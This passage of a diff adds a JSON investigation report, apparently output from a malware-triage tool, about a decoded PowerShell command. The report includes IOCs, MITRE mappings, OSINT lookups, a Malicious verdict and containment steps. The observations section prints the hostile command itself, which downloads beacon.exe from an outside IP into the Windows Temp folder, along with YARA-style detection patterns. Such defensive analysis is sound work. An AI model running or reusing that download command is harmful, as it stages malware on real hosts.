+            {
+              "id": "T1059.001",
+              "technique": "PowerShell Invoke-WebRequest/IRM download cmdlet",
+              "tactic": "Execution"
+            },
+            {
+              "id": "T1074.001",
+              "technique": "Local staging in Public/ProgramData/Temp directory",
+              "tactic": "Collection"
+            }
+          ],
+          "yara": [
+            {
+              "rule": "PS_DownloadString",
+              "severity": "high",
+              "match": "Invoke-WebRequest",
+              "description": "Remote script/binary download"
+            },
+            {
+              "rule": "PS_CaseMixed_Obfuscation",
+              "severity": "low",
+              "match": "Invoke",
+              "description": "Alternating-case keyword obfuscation to evade string-signature detection"
+            }
+          ],
+          "ti_hits": [],
+          "live_osint": {},
+          "family_hint": "cobaltstrike",
+          "severity": {
+            "score": 29,
+            "band": "low"
+          }
+        }
+      ],
+      "iocs": {
+        "urls": [
+          "http://185.220.101.5/beacon.exe"
+        ],
+        "ips": [
+          "185.220.101.5"
+        ],
+        "domains": [],
+        "emails": [],
+        "md5": [],
+        "sha1": [],
+        "sha256": [],
+        "bitcoin_addresses": []
+      },
+      "recursion_report": {
+        "iterations": 2,
+        "artifacts_processed": 2,
+        "artifacts_discovered": 1,
+        "commands_decoded": 1,
+        "scripts_recovered": 0,
+        "archives_unpacked": 0,
+        "iocs_extracted": 4,
+        "mitre_techniques": 3,
+        "hypotheses_validated": 1,
+        "fixed_point_reached": true,
+        "reason_no_new": {
+          "nodes": true,
+          "edges": true,
+          "iocs": true,
+          "mitre": true,
+          "hypotheses": true,
+          "confidence": true
+        },
+        "max_depth_reached": 1,
+        "duration_ms": 1,
+        "status": "complete",
+        "policy": "standard",
+        "trace": [
+          {
+            "iteration": 1,
+            "artifact_id": "A-0",
+            "kind": "command",
+            "depth": 0,
+            "investigator": "command",
+            "new_nodes": 2,
+            "new_artifacts": 1,
+            "note": "extracted 2 nodes / 1 artifacts",
+            "snapshot_hash": "9b3b37d5dbc45bf6a683b3647522581fb99f1fd8fdb0cc7dc0404af0d29a1def"
+          },
+          {
+            "iteration": 2,
+            "artifact_id": "REC-A-0-0001-a",
+            "kind": "url",
+            "depth": 1,
+            "investigator": "url",
+            "new_nodes": 0,
+            "new_artifacts": 0,
+            "note": "url pivots to OSINT via cio.metadata.osint",
+            "snapshot_hash": "9b3b37d5dbc45bf6a683b3647522581fb99f1fd8fdb0cc7dc0404af0d29a1def"
+          }
+        ]
+      },
+      "osint": {
+        "local": {
+          "by_value": {},
+          "by_kind": {},
+          "sources": {},
+          "summary": {
+            "total_lookups": 2,
+            "matches": 0
+          }
+        },
+        "live": {
+          "ips": [
+            {
+              "value": "185.220.101.5",
+              "reverse_dns": "berlin01.tor-exit.artikel10.org",
+              "geo": {
+                "status": "success",
+                "country": "Germany",
+                "countryCode": "DE",
+                "regionName": "Brandenburg",
+                "city": "Brandenburg an der Havel",
+                "isp": "Stiftung Erneuerbare Freiheit",
+                "org": "Artikel10 e.V",
+                "as": "AS60729 Stiftung Erneuerbare Freiheit",
+                "mobile": false,
+                "proxy": true,
+                "hosting": true,
+                "query": "185.220.101.5"
+              },
+              "abuseipdb": {
+                "abuse_confidence_score": 100,
+                "country_code": "DE",
+                "usage_type": "Fixed Line ISP",
+                "isp": "Artikel10 e.V.",
+                "total_reports": 202,
+                "last_reported_at": "2026-08-01T09:44:11+00:00",
+                "is_tor": true
+              },
+              "otx": {
+                "pulse_count": 50,
+                "reputation": 0,
+                "pulses": [
+                  {
+                    "name": "Gifted1 Live Perimeter Threat Intelligence Feed",
+                    "tags": [
+                      "Scanner",
+                      "Malicious-IP",
+                      "Threat-Intel",
+                      "Blocklist"
+                    ]
+                  },
+                  {
+                    "name": "IOC Records Provided by @NextRayAI",
+                    "tags": [
+                      "Nextray",
+                      "cyber security",
+                      "ioc",
+                      "phishing",
+                      "malicious"
+                    ]
+                  },
+                  {
+                    "name": "Anonymization_Network | Jul 2, 2026 | Part 1/5",
+                    "tags": [
+                      "anonymization_network"
+                    ]
+                  }
+                ]
+              }
+            }
+          ],
+          "domains": [],
+          "urls": [
+            {
+              "value": "http://185.220.101.5/beacon.exe",
+              "scheme": "http",
+              "host": "185.220.101.5",
+              "path": "/beacon.exe",
+              "port": null,
+              "is_onion": false,
+              "urlscan": {
+                "total": 46,
+                "results": [
+                  {
+                    "url": "https://185.220.101.5/",
+                    "verdict": null,
+                    "score": null,
+                    "scan_id": "019f7ee0-c5bf-762d-867c-698f057b7e6b"
+                  },
+                  {
+                    "url": "https://185.220.101.5/",
+                    "verdict": null,
+                    "score": null,
+                    "scan_id": "019ebf33-1b4d-7407-8250-125638bf86ea"
+                  },
+                  {
+                    "url": "https://185.220.101.5/",
+                    "verdict": null,
+                    "score": null,
+                    "scan_id": "019ebf17-acf4-71ba-8a83-56fb2322ea9e"
+                  }
+                ]
+              },
+              "otx": {
+                "pulse_count": 0,
+                "reputation": null,
+                "pulses": []
+              }
+            }
+          ],
+          "hashes": [],
+          "sources_used": [
+            "ip-api.com (geolocation, no key)",
+            "system DNS (reverse lookup, resolution)",
+            "AbuseIPDB",
+            "URLScan.io",
+            "AlienVault OTX",
+            "Hybrid Analysis"
+          ]
+        },
+        "providers_used": [
+          "ip-api.com (geolocation, no key)",
+          "system DNS (reverse lookup, resolution)",
+          "AbuseIPDB",
+          "URLScan.io",
+          "AlienVault OTX",
+          "Hybrid Analysis"
+        ],
+        "engine": "shared:workspace"
+      }
+    },
+    "truth": {
+      "version": "1.0",
+      "observations": [
+        {
+          "id": "O-N-002",
+          "kind": "decoded_fragment",
+          "label": "Layer 0: extract-payload",
+          "value": "powershell -c \"Invoke-WebRequest -Uri http://185.220.101.5/beacon.exe -OutFile C:\\Windows\\Temp\\beacon.exe\"",
+          "confidence": 0.85,
+          "source_node_ids": [
+            "N-002"
+          ],
+          "support": [
+            {
+              "node_id": "N-002",
+              "relation": "derives_from",
+              "weight": 0.85
+            }
+          ],
+          "provenance": "decoder:extract-payload"
+        },
+        {
+          "id": "O-N-003",
+          "kind": "decoded_fragment",
+          "label": "Layer 1: family-cobaltstrike",
+          "value": "powershell -c \"Invoke-WebRequest -Uri http://185.220.101.5/beacon.exe -OutFile C:\\Windows\\Temp\\beacon.exe\"",
+          "confidence": 0.85,
+          "source_node_ids": [
+            "N-003"
+          ],
+          "support": [
+            {
+              "node_id": "N-003",
+              "relation": "derives_from",
+              "weight": 0.85
+            }
+          ],
+          "provenance": "decoder:family-cobaltstrike"
+        },
+        {
+          "id": "O-N-004",
+          "kind": "ioc",
+          "label": "URL \u00b7 http://185.220.101.5/beacon.exe",
+          "value": "http://185.220.101.5/beacon.exe",
+          "confidence": 0.9,
+          "source_node_ids": [
+            "N-004"
+          ],
+          "support": [
+            {
+              "node_id": "N-004",
+              "relation": "derives_from",
+              "weight": 0.9
+            }
+          ],
+          "provenance": "extractor:ioc"
+        },
+        {
+          "id": "O-N-005",
+          "kind": "ioc",
+          "label": "IP \u00b7 185.220.101.5",
+          "value": "185.220.101.5",
+          "confidence": 0.9,
+          "source_node_ids": [
+            "N-005"
+          ],
+          "support": [
+            {
+              "node_id": "N-005",
+              "relation": "derives_from",
+              "weight": 0.9
+            }
+          ],
+          "provenance": "extractor:ioc"
+        },
+        {
+          "id": "O-N-006",
+          "kind": "mitre_technique",
+          "label": "Ingress Tool Transfer",
+          "value": "T1105",
+          "confidence": 0.8,
+          "source_node_ids": [
+            "N-006"
+          ],
+          "support": [
+            {
+              "node_id": "N-006",
+              "relation": "derives_from",
+              "weight": 0.8
+            }
+          ],
+          "provenance": "mitre:inferred"
+        },
+        {
+          "id": "O-N-007",
+          "kind": "mitre_technique",
+          "label": "PowerShell",
+          "value": "T1059.001",
+          "confidence": 0.8,
+          "source_node_ids": [
+            "N-007"
+          ],
+          "support": [
+            {
+              "node_id": "N-007",
+              "relation": "derives_from",
+              "weight": 0.8
+            }
+          ],
+          "provenance": "mitre:inferred"
+        },
+        {
+          "id": "O-N-008",
+          "kind": "mitre_technique",
+          "label": "Local staging in Public/ProgramData/Temp directory",
+          "value": "T1074.001",
+          "confidence": 0.8,
+          "source_node_ids": [
+            "N-008"
+          ],
+          "support": [
+            {
+              "node_id": "N-008",
+              "relation": "derives_from",
+              "weight": 0.8
+            }
+          ],
+          "provenance": "mitre:inferred"
+        },
+        {
+          "id": "O-N-009",
+          "kind": "lolbin",
+          "label": "LOLBIN \u00b7 powershell",
+          "value": "powershell",
+          "confidence": 0.7,
+          "source_node_ids": [
+            "N-009"
+          ],
+          "support": [
+            {
+              "node_id": "N-009",
+              "relation": "derives_from",
+              "weight": 0.7
+            }
+          ],
+          "provenance": "rule:lolbin_scan"
+        },
+        {
+          "id": "O-N-010",
+          "kind": "verdict",
+          "label": "Verdict \u00b7 Malicious",
+          "value": "Malicious",
+          "confidence": 0.9746,
+          "source_node_ids": [
+            "N-010"
+          ],
+          "support": [
+            {
+              "node_id": "N-010",
+              "relation": "derives_from",
+              "weight": 0.9746
+            }
+          ],
+          "provenance": "engine:unified-verdict"
+        },
+        {
+          "id": "O-REC-A-0-0001",
+          "kind": "ioc",
+          "label": "URL \u00b7 http://185.220.101.5/beacon.exe",
+          "value": "http://185.220.101.5/beacon.exe",
+          "confidence": 0.85,
+          "source_node_ids": [
+            "REC-A-0-0001"
+          ],
+          "support": [
+            {
+              "node_id": "REC-A-0-0001",
+              "relation": "derives_from",
+              "weight": 0.85
+            }
+          ],
+          "provenance": "recursive:A-0"
+        },
+        {
+          "id": "O-REC-A-0-0002",
+          "kind": "ioc",
+          "label": "IP \u00b7 185.220.101.5",
+          "value": "185.220.101.5",
+          "confidence": 0.8,
+          "source_node_ids": [
+            "REC-A-0-0002"
+          ],
+          "support": [
+            {
+              "node_id": "REC-A-0-0002",
+              "relation": "derives_from",
+              "weight": 0.8
+            }
+          ],
+          "provenance": "recursive:A-0"
+        }
+      ],
+      "findings": [
+        {
+          "id": "F-001",
+          "title": "IP \u00b7 185.220.101.5",
+          "severity": "high",
+          "detail": "external_ioc_ip \u00b7 class=high \u00b7 weight=3.0 \u00b7 confidence=0.9 \u00b7 source=graph",
+          "source_observation_ids": [
+            "O-N-005"
+          ],
+          "source_node_ids": [
+            "N-005"
+          ],
+          "support": [
+            {
+              "node_id": "N-005",
+              "relation": "supports",
+              "weight": 0.3
+            }
+          ],
+          "tactic": null,
+          "technique_id": null
+        },
+        {
+          "id": "F-002",
+          "title": "Ingress Tool Transfer",
+          "severity": "high",
+          "detail": "network_staging \u00b7 class=high \u00b7 weight=3.0 \u00b7 confidence=0.8 \u00b7 source=graph",
+          "source_observation_ids": [
+            "O-N-006"
+          ],
+          "source_node_ids": [
+            "N-006"
+          ],
+          "support": [
+            {
+              "node_id": "N-006",
+              "relation": "supports",
+              "weight": 0.3
+            }
+          ],
+          "tactic": null,
+          "technique_id": null
+        },
+        {
+          "id": "F-003",
+          "title": "IP \u00b7 185.220.101.5",
+          "severity": "high",
+          "detail": "external_ioc_ip \u00b7 class=high \u00b7 weight=3.0 \u00b7 confidence=0.8 \u00b7 source=graph",
+          "source_observation_ids": [
+            "O-REC-A-0-0002"
+          ],
+          "source_node_ids": [
+            "REC-A-0-0002"
+          ],
+          "support": [
+            {
+              "node_id": "REC-A-0-0002",
+              "relation": "supports",
+              "weight": 0.3
+            }
+          ],
+          "tactic": null,
+          "technique_id": null
+        },
+        {
+          "id": "F-004",
+          "title": "Correlated evidence chain \u00b7 3 stages",
+          "severity": "high",
+          "detail": "execution_chain_correlated \u00b7 class=high \u00b7 weight=3.0 \u00b7 confidence=0.8 \u00b7 source=graph",
+          "source_observation_ids": [],
+          "source_node_ids": [
+            "SYNTH-CHAIN-3"
+          ],
+          "support": [
+            {
+              "node_id": "SYNTH-CHAIN-3",
+              "relation": "supports",
+              "weight": 0.3
+            }
+          ],
+          "tactic": null,
+          "technique_id": null
+        },
+        {
+          "id": "F-005",
+          "title": "LOLBIN \u00b7 powershell",
+          "severity": "high",
+          "detail": "lolbin \u00b7 class=high \u00b7 weight=3.0 \u00b7 confidence=0.7 \u00b7 source=graph",
+          "source_observation_ids": [
+            "O-N-009"
+          ],
+          "source_node_ids": [
+            "N-009"
+          ],
+          "support": [
+            {
+              "node_id": "N-009",
+              "relation": "supports",
+              "weight": 0.3
+            }
+          ],
+          "tactic": null,
+          "technique_id": null
+        },
+        {
+          "id": "F-006",
+          "title": "PowerShell",
+          "severity": "medium",
+          "detail": "mitre_technique \u00b7 class=medium \u00b7 weight=2.0 \u00b7 confidence=0.8 \u00b7 source=graph",
+          "source_observation_ids": [
+            "O-N-007"
+          ],
+          "source_node_ids": [
+            "N-007"
+          ],
+          "support": [
+            {
+              "node_id": "N-007",
+              "relation": "supports",
+              "weight": 0.2
+            }
+          ],
+          "tactic": null,
+          "technique_id": null
+        },
+        {
+          "id": "F-007",
+          "title": "Local staging in Public/ProgramData/Temp directory",
+          "severity": "medium",
+          "detail": "mitre_technique \u00b7 class=medium \u00b7 weight=2.0 \u00b7 confidence=0.8 \u00b7 source=graph",
+          "source_observation_ids": [
+            "O-N-008"
+          ],
+          "source_node_ids": [
+            "N-008"
+          ],
+          "support": [
+            {
+              "node_id": "N-008",
+              "relation": "supports",
+              "weight": 0.2
+            }
+          ],
+          "tactic": null,
+          "technique_id": null
+        },
+        {
+          "id": "F-008",
+          "title": "URL \u00b7 http://185.220.101.5/beacon.exe",
+          "severity": "low",
+          "detail": "external_ioc_url \u00b7 class=low \u00b7 weight=1.0 \u00b7 confidence=0.9 \u00b7 source=graph",
+          "source_observation_ids": [
+            "O-N-004"
+          ],
+          "source_node_ids": [
+            "N-004"
+          ],
+          "support": [
+            {
+              "node_id": "N-004",
+              "relation": "supports",
+              "weight": 0.1
+            }
+          ],
+          "tactic": null,
+          "technique_id": null
+        },
+        {
+          "id": "F-009",
+          "title": "internal decoder step",
+          "severity": "low",
+          "detail": "base64_layer \u00b7 class=low \u00b7 weight=1.0 \u00b7 confidence=0.85 \u00b7 source=graph",
+          "source_observation_ids": [
+            "O-N-002"
+          ],
+          "source_node_ids": [
+            "N-002"
+          ],
+          "support": [
+            {
+              "node_id": "N-002",
+              "relation": "supports",
+              "weight": 0.1
+            }
+          ],
+          "tactic": null,
+          "technique_id": null
+        },
+        {
+          "id": "F-010",
+          "title": "internal decoder step",
+          "severity": "low",
+          "detail": "base64_layer \u00b7 class=low \u00b7 weight=1.0 \u00b7 confidence=0.85 \u00b7 source=graph",
+          "source_observation_ids": [
+            "O-N-003"
+          ],
+          "source_node_ids": [
+            "N-003"
+          ],
+          "support": [
+            {
+              "node_id": "N-003",
+              "relation": "supports",
+              "weight": 0.1
+            }
+          ],
+          "tactic": null,
+          "technique_id": null
+        },
+        {
+          "id": "F-011",
+          "title": "URL \u00b7 http://185.220.101.5/beacon.exe",
+          "severity": "low",
+          "detail": "external_ioc_url \u00b7 class=low \u00b7 weight=1.0 \u00b7 confidence=0.85 \u00b7 source=graph",
+          "source_observation_ids": [
+            "O-REC-A-0-0001"
+          ],
+          "source_node_ids": [
+            "REC-A-0-0001"
+          ],
+          "support": [
+            {
+              "node_id": "REC-A-0-0001",
+              "relation": "supports",
+              "weight": 0.1
+            }
+          ],
+          "tactic": null,
+          "technique_id": null
+        },
+        {
+          "id": "F-SYN-SYNTH-CHAIN-3",
+          "title": "Correlated evidence chain \u00b7 3 stages",
+          "severity": "high",
+          "detail": "synthetic signal \u00b7 graph_topology \u00b7 confidence 0.80 \u00b7 chain_depth=3",
+          "source_observation_ids": [],
+          "source_node_ids": [
+            "SYNTH-CHAIN-3"
+          ],
+          "support": [
+            {
+              "node_id": "SYNTH-CHAIN-3",
+              "relation": "supports",
+              "weight": 0.8
+            }
+          ],
+          "tactic": null,
+          "technique_id": null
+        }
+      ],
+      "hypotheses": [
+        {
+          "id": "H-LOLBAS-DOWNLOADER",
+          "statement": "Attacker used a LOLBAS-based downloader chain to stage a payload.",
+          "status": "validated",
+          "confidence": 0.95,
+          "supporting_finding_ids": [
+            "F-005"
+          ],
+          "counter_finding_ids": [],
+          "support": [
+            {
+              "node_id": "N-009",
+              "relation": "supports",
+              "weight": 0.3
+            }
+          ],
+          "rationale": "LOLBIN / signed-binary-proxy behaviour observed with network-bound intent."
+        }
+      ],
+      "validations": [
+        {
+          "hypothesis_id": "H-LOLBAS-DOWNLOADER",
+          "outcome": "validated",
+          "supporting_evidence": [
+            "F-005"
+          ],
+          "counter_evidence": [],
+          "support": [
+            {
+              "node_id": "N-009",
+              "relation": "supports",
+              "weight": 0.3
+            }
+          ],
+          "escalation_rule": null,
+          "detail": "Verdict engine reported Malicious at 99%. 1 supporting findings, 0 counter findings."
+        }
+      ],
+      "decision": {
+        "label": "Malicious",
+        "confidence_pct": 99,
+        "reason": "Verdict derived from class distribution: 0 critical \u00b7 5 high \u00b7 2 medium \u00b7 4 low \u00b7 0 context. Top contributors: IP \u00b7 185.220.101.5 [high, w=3.0] \u00b7 Ingress Tool Transfer [high, w=3.0] \u00b7 IP \u00b7 185.220.101.5 [high, w=3.0].",
+        "escalation_rule": null,
+        "confidence_breakdown": {
+          "critical": 0,
+          "high": 96,
+          "medium": 54,
+          "low": 30,
+          "context": 0,
+          "mitigating": 0
+        },
+        "support": [
+          {
+            "node_id": "N-005",
+            "relation": "supports",
+            "weight": 0.3
+          },
+          {
+            "node_id": "N-006",
+            "relation": "supports",
+            "weight": 0.3
+          },
+          {
+            "node_id": "REC-A-0-0002",
+            "relation": "supports",
+            "weight": 0.3
+          },
+          {
+            "node_id": "SYNTH-CHAIN-3",
+            "relation": "supports",
+            "weight": 0.8
+          },
+          {
+            "node_id": "N-009",
+            "relation": "supports",
+            "weight": 0.3
+          },
+          {
+            "node_id": "N-007",
+            "relation": "supports",
+            "weight": 0.2
+          },
+          {
+            "node_id": "N-008",
+            "relation": "supports",
+            "weight": 0.2
+          },
+          {
+            "node_id": "N-004",
+            "relation": "supports",
+            "weight": 0.1
+          },
+          {
+            "node_id": "N-002",
+            "relation": "supports",
+            "weight": 0.1
+          },
+          {
+            "node_id": "N-003",
+            "relation": "supports",
+            "weight": 0.1
+          },
+          {
+            "node_id": "REC-A-0-0001",
+            "relation": "supports",
+            "weight": 0.1
+          }
+        ],
+        "engine": "unified-verdict-engine-v1"
+      },
+      "recommendations": [
+        {
+          "id": "R-CONTAIN",
+          "action": "contain",
+          "priority": "p0",
+          "detail": "Isolate the affected host from the network and preserve volatile memory. Block the extracted C2 indicators at the perimeter and endpoint layers.",
+          "support": [
+            {
+              "node_id": "N-009",
+              "relation": "supports",
+              "weight": 0.3
+            }
+          ],
+          "playbook_ref": "MDR-SOP-001-endpoint-containment"
+        },
+        {
+          "id": "R-HUNT",
+          "action": "hunt",
+          "priority": "p1",
+          "detail": "Hunt for the same execution chain and extracted IOCs across the estate over the past 30 days. Correlate against parent-process / user-SID entities.",
+          "support": [
+            {
+              "node_id": "N-009",
+              "relation": "supports",
+              "weight": 0.3
+            }
+          ],
+          "playbook_ref": "MDR-SOP-014-lateral-hunt"
+        },
+        {
+          "id": "R-NOTIFY",
+          "action": "notify",
+          "priority": "p1",
+          "detail": "Notify the customer with the Investigation Truth Model summary, the extracted IOCs, and the confidence-breakdown chart. Attach the STIX bundle.",
+          "support": [
+            {
+              "node_id": "N-009",
+              "relation": "supports",
+              "weight": 0.3
+            }
+          ],
+          "playbook_ref": null
+        }
+      ]
+    }
+  },
+  "route": "decode"
+}
